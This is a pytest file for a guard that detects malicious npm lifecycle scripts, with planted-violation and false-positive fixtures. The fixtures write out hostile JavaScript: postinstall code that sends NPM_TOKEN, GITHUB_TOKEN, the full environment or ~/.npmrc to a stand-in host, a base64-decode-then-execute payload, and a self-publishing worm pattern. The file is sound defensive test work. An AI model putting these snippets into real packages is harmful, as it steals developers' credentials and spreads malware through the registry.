"""Tests for NpmLifecycleScriptSourceSinksGuard — planted-violation + FP-bait per rule."""
from __future__ import annotations

import json

import pytest

from agentsec.guards.npm_lifecycle_script_source_sinks import NpmLifecycleScriptSourceSinksGuard
from tests.guards._common import *  # noqa: F401,F403

_P = "npm-lifecycle-script-source-sinks/"


def _prof(root: Path) -> StackProfile:
    return mkprofile(root, features=set())


def _pkg(root: Path, scripts: dict[str, str], *, extra: dict | None = None) -> None:
    (root / "package.json").write_text(json.dumps({"name": "x", "scripts": scripts, **(extra or {})}), encoding="utf-8")


def _js(root: Path, name: str, body: str) -> None:
    p = root / name
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(body, encoding="utf-8")


def _rules(root: Path) -> set[str]:
    return {f.rule for f in NpmLifecycleScriptSourceSinksGuard().run(root, _prof(root))}


# ── planted violations ───────────────────────────────────────────────────────

def test_exfil_env_token_over_https_fires(tmp_path: Path) -> None:
    _pkg(tmp_path, {"postinstall": "node scripts/setup.js"})
    _js(tmp_path, "scripts/setup.js",
        "const https = require('https');\nhttps.request('https://x.example/in').end(process.env.NPM_TOKEN);\n")
    findings = NpmLifecycleScriptSourceSinksGuard().run(tmp_path, _prof(tmp_path))
    hit = next(f for f in findings if f.rule == _P + "lifecycle-script-exfil")
    assert hit.severity == "high"
    assert hit.location.replace("\\", "/") == "scripts/setup.js"


def test_exfil_secret_path_with_fetch_fires(tmp_path: Path) -> None:
    _pkg(tmp_path, {"preinstall": "node ./setup"})
    _js(tmp_path, "setup.js",
        "const fs = require('fs'); const os = require('os');\n"
        "const t = fs.readFileSync(os.homedir() + '/.npmrc', 'utf8');\n"
        "fetch('https://x.example', { method: 'POST', body: t });\n")
    assert _P + "lifecycle-script-exfil" in _rules(tmp_path)


def test_exfil_env_dump_via_node_prefix_import_fires(tmp_path: Path) -> None:
    """Bypass variant: `node:https` ESM import, `--flag` before the file, `&&` chain, env spread."""
    _pkg(tmp_path, {"install": "npm run build && node --no-warnings ./lib/x.mjs"})
    _js(tmp_path, "lib/x.mjs",
        "import https from 'node:https';\nconst body = JSON.stringify({ ...process.env });\n"
        "https.get('https://x.example/?d=' + body);\n")
    assert _P + "lifecycle-script-exfil" in _rules(tmp_path)


def test_inline_node_eval_program_is_analysed(tmp_path: Path) -> None:
    _pkg(tmp_path, {"postinstall": "node -e \"require('https').get('https://x.example/'+process.env.GITHUB_TOKEN)\""})
    assert _P + "lifecycle-script-exfil" in _rules(tmp_path)


def test_base64_decode_then_exec_fires(tmp_path: Path) -> None:
    _pkg(tmp_path, {"postinstall": "node run.js"})
    _js(tmp_path, "run.js",
        "const p = Buffer.from('Y29uc29sZS5sb2coJ3B3bmVkJyk7Y29uc29sZS5sb2coMSk=', 'base64').toString();\n"
        "new Function(p)();\n")
    rules = _rules(tmp_path)
    assert _P + "lifecycle-script-base64-exec" in rules
    assert _P + "lifecycle-script-dynamic-eval" in rules


def test_worm_pair_fires(tmp_path: Path) -> None:
    _pkg(tmp_path, {"postinstall": "node worm.js"})
    _js(tmp_path, "worm.js",
        "const fs = require('fs'); const cp = require('child_process');\n"
        "fs.writeFileSync('package.json', JSON.stringify(pkg));\n"
        "cp.execSync('npm publish --access public');\n")
    assert _P + "lifecycle-script-worm-propagate" in _rules(tmp_path)


def test_worm_pair_with_spawn_array_form_fires(tmp_path: Path) -> None:
    _pkg(tmp_path, {"prepare": "node worm.js"})
    _js(tmp_path, "worm.js",
        "fs.promises.writeFile(path.join(dir, 'package.json'), data);\nspawn('npm', ['publish']);\n")
    assert _P + "lifecycle-script-worm-propagate" in _rules(tmp_path)


def test_dynamic_eval_alone_is_medium(tmp_path: Path) -> None:
    _pkg(tmp_path, {"postinstall": "node x.js"})
    _js(tmp_path, "x.js", "eval(process.argv[2]);\n")
    findings = NpmLifecycleScriptSourceSinksGuard().run(tmp_path, _prof(tmp_path))
    assert [f.severity for f in findings] == ["medium"]


# ── FP-bait ──────────────────────────────────────────────────────────────────

def test_binary_download_script_with_ordinary_env_is_safe(tmp_path: Path) -> None:
    """A prebuild-style download: network module, process.env.CI / npm_config_* / proxy reads."""
    _pkg(tmp_path, {"postinstall": "node scripts/download.js"})
    _js(tmp_path, "scripts/download.js",
        "const https = require('https');\nconst proxy = process.env.npm_config_https_proxy || process.env.HTTPS_PROXY;\n"
        "if (process.env.CI) process.exit(0);\nhttps.get('https://github.com/x/releases/y.tgz', cb);\n")
    assert _rules(tmp_path) == set()


def test_network_free_script_reading_secret_path_is_safe(tmp_path: Path) -> None:
    _pkg(tmp_path, {"postinstall": "node setup.js"})
    _js(tmp_path, "setup.js", "const f = require('fs').readFileSync('.npmrc', 'utf8'); console.log(f.length);\n")
    assert _rules(tmp_path) == set()


def test_sinks_in_comments_are_ignored(tmp_path: Path) -> None:
    _pkg(tmp_path, {"postinstall": "node setup.js"})
    _js(tmp_path, "setup.js", "// eval(x) and npm publish and writeFile('package.json')\nconsole.log('ok');\n")
    assert _rules(tmp_path) == set()


@pytest.mark.parametrize("script", ["node-gyp rebuild", "prebuild-install || node-gyp rebuild", "husky install"])
def test_native_build_scripts_are_safe(tmp_path: Path, script: str) -> None:
    _pkg(tmp_path, {"install": script})
    assert _rules(tmp_path) == set()


def test_sink_file_not_run_by_a_lifecycle_script_is_safe(tmp_path: Path) -> None:
    _pkg(tmp_path, {"release": "node release.js", "postinstall": "node setup.js"})
    _js(tmp_path, "release.js", "const cp = require('child_process'); fs.writeFileSync('package.json', x); cp.execSync('npm publish');\n")
    _js(tmp_path, "setup.js", "console.log('hi');\n")
    assert _rules(tmp_path) == set()


def test_path_escaping_the_repo_is_ignored(tmp_path: Path) -> None:
    outer = tmp_path / "outer"
    inner = outer / "inner"
    inner.mkdir(parents=True)
    _js(outer, "evil.js", "eval(x);\n")
    _pkg(inner, {"postinstall": "node ../evil.js"})
    assert _rules(inner) == set()


def test_missing_script_file_is_safe(tmp_path: Path) -> None:
    _pkg(tmp_path, {"postinstall": "node does-not-exist.js"})
    assert _rules(tmp_path) == set()


# ── suppression / applies() ──────────────────────────────────────────────────

def test_pragma_in_js_file_suppresses(tmp_path: Path) -> None:
    _pkg(tmp_path, {"postinstall": "node x.js"})
    _js(tmp_path, "x.js", "// security: allow-npm-lifecycle-script-source-sinks\neval(process.argv[2]);\n")
    assert _rules(tmp_path) == set()


def test_pragma_in_package_json_suppresses(tmp_path: Path) -> None:
    _pkg(tmp_path, {"postinstall": "node x.js"}, extra={"//": "security: allow-npm-lifecycle-script-source-sinks"})
    _js(tmp_path, "x.js", "eval(process.argv[2]);\n")
    assert _rules(tmp_path) == set()


def test_applies_universally(tmp_path: Path) -> None:
    assert NpmLifecycleScriptSourceSinksGuard().applies(_prof(tmp_path)) is True
